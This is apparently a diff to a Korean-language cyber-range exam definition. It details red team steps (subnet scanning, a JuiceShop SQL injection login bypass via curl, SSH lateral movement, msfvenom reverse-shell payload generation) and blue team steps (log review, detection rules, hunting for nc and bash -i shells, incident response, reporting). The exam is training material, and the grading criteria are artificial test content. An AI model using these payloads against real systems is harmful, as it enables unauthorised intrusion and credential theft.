@@ -36,20 +36,21 @@ steps:
     type: output_contains
     expect: open
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 1/RED] 종합 시험 정보 수집 — nmap -sn 10.20.30.0/24 로 활성 호스트 발견 + nmap -sV --top-ports 100
+        각 호스트 (secu·web·siem) 서비스 탐지. 결과를 /tmp/exam_recon.txt 에 구조화 저장 (hostname·IP·open port·service·version
+        표). 15주 학습 성과 평가의 첫 관문'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - nmap -sn + -sV 두 단계
+      - /tmp/exam_recon.txt 구조화 저장
+      - 시험 맥락 (독립 수행)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nmap + 표 작성
+      - masscan + nmap 2-stage
+      - curl -I + tabulate
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단일 호스트만
+      - 결과 저장 없음
+      - 독립 수행 아닌 복사
   target_vm: attacker
   script: 'nmap -sV --top-ports 50 --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oN /tmp/exam_recon.txt
     2>&1 | tail -30 && echo "---" && echo "Structured: Host | Port | Service | Version" && grep "open"
@@ -70,20 +71,21 @@ steps:
     type: output_contains
     expect: Initial access
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 2/RED] 초기 침투 — curl -s -X POST http://<web>:3000/rest/user/login -H Content-Type: application/json
+        -d {email: '' or 1=1--, password: x} 로 JuiceShop 관리자 인증 우회 → JWT 토큰 획득 → /tmp/exam_jwt.txt 저장.
+        성공 시 /api/Users 접근 확인'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - /rest/user/login SQLi
+      - JWT 토큰 획득 + /tmp 저장
+      - /api 접근 검증
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl POST + JSON body
+      - sqlmap
+      - python requests
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 토큰 미획득
+      - JSON 바디 아닌 form
+      - API 접근 검증 없음
   target_vm: attacker
   script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
     \ \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' \\\n | python3 -m json.tool | head -10\
@@ -107,20 +109,21 @@ steps:
     type: output_contains
     expect: Lateral Movement
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 3/RED] 측면 이동 — ssh ccc@<secu> hostname && id + ssh ccc@<web> uname -a (내부 서버 2개 접근)
+        + msfvenom -p linux/x64/shell_reverse_tcp -f elf -o /tmp/exam_payload.elf (생성만·실행 없음). 측면 이동 실증
+        + weaponization 보조'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - SSH 내부 서버 2+ 접근
+      - msfvenom payload 생성 (저장만)
+      - 측면 이동 + weapon 조합
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - ssh + msfvenom -f elf
+      - crackmapexec smb
+      - Sliver beacon 생성
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1 서버만
+      - payload 실제 실행
+      - 측면 이동 개념 없음
   target_vm: attacker
   script: echo "=== Lateral Movement ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
     "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100
@@ -144,20 +147,21 @@ steps:
     type: output_contains
     expect: Blue Team Detection
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 4/BLUE] 관점 전환 자가 탐지 — s1-s3 공격을 공격자 → 방어자 관점 전환 후 흔적 찾기: auth.log (SSH 접속 Accepted·Failed)
+        + access.log (SQLi URL 패턴) + Suricata fast.log (SCAN·WEB-ATTACK) + ls /tmp (msfvenom payload).
+        모든 공격이 어떤 로그에 남았는지 종합 리뷰. 자기 공격 사후 분석'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - 최소 3 로그 조회 (auth·access·Suricata·files)
+      - s1-s3 공격 흔적 식별
+      - 자가 탐지 관점 전환
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - tail + grep 복수 로그
+      - Wazuh timeline
+      - jq 로 eve.json
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1-2 로그만
+      - s1-s3 연관 없음
+      - 관점 전환 개념 없음
   target_vm: secu
   script: 'echo "=== Blue Team Detection ===" && echo "[1] auth.log:" && grep -E "Accepted|Failed" /var/log/auth.log
     2>/dev/null | tail -5 && echo "[2] Network:" && ss -tn | grep "10.20.30" | head -5 && echo "[3] Evidence
@@ -185,20 +189,21 @@ steps:
     type: output_contains
     expect: EXAM
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 5/BLUE] 탐지 룰 작성 — s4 에서 발견된 Gap(예: msfvenom payload 생성 이벤트 미탐지·내부 SSH 측면 이동 임계치 느슨)
+        에 대해 Suricata(alert tcp flags:S 내부→내부 threshold) 또는 Wazuh(syscheck real-time=yes /tmp + ELF magic
+        bytes 룰). /etc/suricata/rules/local.rules 또는 local_rules.xml 편집'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - Gap 기반 새 룰 작성
+      - Suricata 또는 Wazuh 포맷
+      - 시스템 적용 (/etc/suricata 또는 /var/ossec)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - alert tcp ... threshold 조정
+      - Wazuh syscheck + decoder
+      - Sigma rule 변환
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - Gap 분석 없이 일반 룰
+      - 적용 없음 (작성만)
+      - s4 연결 없음
   target_vm: secu
   script: 'cat > /tmp/exam_detection_rule.txt << ''EOF'' # Suricata: SQL Injection in POST body alert
     http any any -> 10.20.30.0/24 any (msg:"EXAM: SQLi in POST"; flow:to_server,established; http.method;
@@ -226,20 +231,21 @@ steps:
     type: output_contains
     expect: Threat Hunting
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 6/BLUE] 능동적 위협 헌팅 — 3+ 소스 분석: (1) find / -mtime -1 -type f (최근 수정 파일) (2) ps auxf |
+        grep -E (sh -i|bash -i|nc) (reverse shell) (3) jq DNS 엔트로피 > 3.5 eve.json (4) crontab -l + /etc/cron.d
+        (지속성). 가설 수립 없이 heuristic search. 시험에서 독립 헌팅 수행'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - 3+ 소스 헌팅
+      - find + ps + DNS + cron 등
+      - 능동 탐색 (가설 → 검증)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - 복합 find + ps + jq
+      - Sigma rule 매칭
+      - osquery 복합 쿼리
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1-2 소스만
+      - 가설 없이 나열만
+      - 능동 탐색 개념 없음
   target_vm: secu
   script: 'echo "=== Threat Hunting ===" && echo "[1] Process:" && ps aux | grep -E "nc -|ncat|python.*socket|perl.*socket"
     | grep -v grep || echo "Clean" && echo "[2] Network:" && ss -tn | grep -v "10.20.30\|127.0" | head
@@ -264,20 +270,22 @@ steps:
     type: output_contains
     expect: Incident Response
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 7/BLUE] 인시던트 대응 5분 내 — SQLi 가정 시 (1) 확인 1분: grep UNION access.log + Suricata fast.log
+        (2) 격리 1분: nft add element @blocklist { <IP> } (3) 증거 수집 2분: mkdir /tmp/ir_evidence + cp access.log
+        + ps auxf > processes.txt + ss -tunapl > net.txt (4) 보고 1분: /tmp/ir_report.txt + ID/severity/timeline.
+        NIST SP 800-61 Containment 시간 측정'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - 확인·격리·수집·보고 4단계
+      - 5분 내 완료 타임박싱
+      - NIST SP 800-61 준거
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - bash script 자동화
+      - TheHive case + Cortex responder
+      - 사전 준비된 IR runbook
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 5분 초과
+      - 4단계 중 일부만
+      - 시간 측정 없음
   target_vm: siem
   script: 'echo "=== Incident Response ===" && TIMESTAMP=$(date -u "+%Y-%m-%dT%H:%M:%SZ") && echo "[$TIMESTAMP]
     INCIDENT: SQLi from 203.0.113.50" && echo "[1] CONTAIN (T+0s): nft add element inet filter blocklist
@@ -309,20 +317,22 @@ steps:
     type: output_contains
     expect: Exam ATT&CK
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 8] ATT&CK 매핑 /tmp/exam_attack_mapping.txt — 사용한 모든 Techniques: T1046 Network Scan (s1)
+        · T1190 Exploit Public App (s2) · T1078 Valid Accounts (s2) · T1021.004 SSH (s3) · T1587.001 Develop
+        Malware (s3). 탐지한 기법도 추가 (T1562 Impair Defenses 반대 방어). MITRE D3FEND 매핑으로 방어 개선 권고 (D3-NTA Network
+        Traffic Analysis 등)'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - /tmp/exam_attack_mapping.txt 파일
+      - 사용 + 탐지 Techniques ATT&CK 매핑
+      - D3FEND 방어 개선 권고
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - MITRE ATT&CK Navigator
+      - D3FEND 대응 매핑
+      - DeTT&CT coverage
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - Techniques 3개 이하
+      - D3FEND 누락
+      - 권고 없음
   target_vm: attacker
   script: 'cat > /tmp/exam_attack_map.txt << ''EOF'' === Exam ATT&CK Mapping ===
 
@@ -360,20 +370,21 @@ steps:
     type: output_contains
     expect: EXECUTIVE SUMMARY
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 9] 경영진 보고서 /tmp/exam_executive_summary.md — 비기술적 독자 대상 1쪽 요약: (1) 전체 위험 (Critical 2건·High
+        3건) (2) Business Impact (고객 데이터 전체 접근·서비스 중단 가능) (3) 핵심 발견 (SQLi·SSH 자격 재사용·Monitoring 시간 gap)
+        (4) 즉시 조치 3가지 (parameterized queries·고유 비밀번호·알림 자동화) (5) 예산·일정. CISO·CEO 의사결정 지원. 기술 용어 최소화'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - /tmp/exam_executive_summary.md 1쪽
+      - 비기술 언어
+      - Business Impact + 조치 + 예산
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file 1쪽
+      - PCI-DSS executive summary 템플릿
+      - Gartner risk report 스타일
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 기술 용어 남발
+      - 분량 과다
+      - Business Impact 없음
   target_vm: attacker
   script: 'cat > /tmp/exam_executive.txt << ''EOF'' === EXECUTIVE SUMMARY: Security Assessment ===
 
@@ -412,20 +423,21 @@ steps:
     type: output_contains
     expect: TECHNICAL ASSESSMENT
     semantic:
-      intent: 종합 평가 관련 실습 스텝 수행
+      intent: '[시험 10] 기술 보고서 /tmp/exam_technical_report.md + 환경 정리 — 각 취약점별 PoC 재현 절차 + CVSS 3.1 vector
+        + 수정 방법 (parameterized queries 코드 예시·SSH key 기반·MFA·API rate limit·FIM). 코드 예시와 설정 변경을 구체적으로 제시.
+        시험 아티팩트 모두 정리 (crontab -r·rm /tmp/exam_* /tmp/.p14·blocklist 복원)'
       success_criteria:
-      - instruction 목표 실행
-      - 결과 출력
-      - 관련 개념 언급
+      - /tmp/exam_technical_report.md 기술 보고서
+      - 취약점 PoC + CVSS + 수정 방법 코드 예시
+      - 환경 완전 정리 (crontab·파일·룰 복원)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 취약점별 섹션
+      - OSCP 보고서 스타일
+      - SANS GPEN 보고서
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - PoC 없음
+      - 수정 코드 없이 개념만
+      - 정리 누락
   target_vm: attacker
   script: "rm -rf /tmp/exam_evidence/ /tmp/exam_payload.elf 2>/dev/null && cat > /tmp/exam_technical_report.txt\
     \ << 'EOF' === TECHNICAL ASSESSMENT REPORT ===\nFinding 1: SQL Injection (CVSS 9.8) Location: POST\
